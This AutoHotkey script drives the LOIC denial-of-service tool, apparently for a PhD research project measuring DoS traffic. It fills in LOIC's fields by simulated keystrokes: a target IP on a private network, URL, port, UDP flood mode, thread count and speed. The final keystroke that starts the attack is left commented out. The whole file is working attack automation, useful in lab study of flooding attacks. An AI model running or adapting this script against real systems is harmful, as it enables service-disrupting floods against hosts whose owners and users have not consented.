#CommentFlag //
// -------------------------------------
// Note: Does not work for slowLOIC attack type
// -------------------------------------

// -------------------------------------
// CONFIG
// -------------------------------------
loic_path =C:\PhD\Projects\_Finished\DoScharacteristics\ToolsBinaries\LOIC.exe

target_ip_address = 192.168.1.20
target_url = www.example.com
target_http_subsite = /index.htm
target_port = 443

attack_type = UDP
attack_speed = 5
attack_tcpudp_message = LOIC_AUTOHOTKEY_TEST
attack_threads = 25
attack_timeout = 50

use_url = False
use_ip = True
append_rndchars_url = False
append_rndchars_msg = True
wait_for_reply = False

// -------------------------------------
// MAIN SCRIPT
// -------------------------------------

// Execute LOIC
Run, %loic_path%

// Give focus to LOIC window
WinActivate, Low Orbit
WinWaitActive, Low Orbit

// Target URL input box
SendInput, %target_url%
Send {TAB}

// Target URL - Lock on button
if use_url = True
	Send {Enter}
Send {TAB}

// Target IP input box 
SendInput %target_ip_address%
Send {TAB}

// Target URL - Lock on button
if use_ip = True
	Send {Enter}
Send {TAB}

// IMMA CHARGIN MAH LAZER - skip this time
Send {TAB}

// Timeout
SendInput %attack_timeout%
Send {TAB}

// HTTP subsite
SendInput %target_http_subsite%
Send {TAB}

// TCP/UDP message
SendInput %attack_tcpudp_message%
Send {TAB}

// Port
SendInput %target_port%
Send {TAB}

// Attack type
SendInput %attack_type%
Send {TAB}

// Threads
SendInput %attack_threads%
Send {TAB}

// Wait for reply
if wait_for_reply = True
	Send {Space}
Send {TAB}

// Attack speed 0-50, 0 - Fastest, 50 - Slowest 
Loop %attack_speed% {
	Send {Right}
}
Send {TAB}

// Append random chars to the URL
if append_rndchars_url = True
	Send {Space}
Send {TAB}

// Append random chars to the message
if append_rndchars_msg = True
	Send {Space}
Send {TAB}

Send {TAB}
Send {TAB}
Send {TAB}
Send {TAB}
Send {TAB}
Send {TAB}
Send {TAB}
Send {TAB}
Send {TAB}
Send {TAB}
Send {TAB}

// To start attack, uncomment last line
// Send {Enter}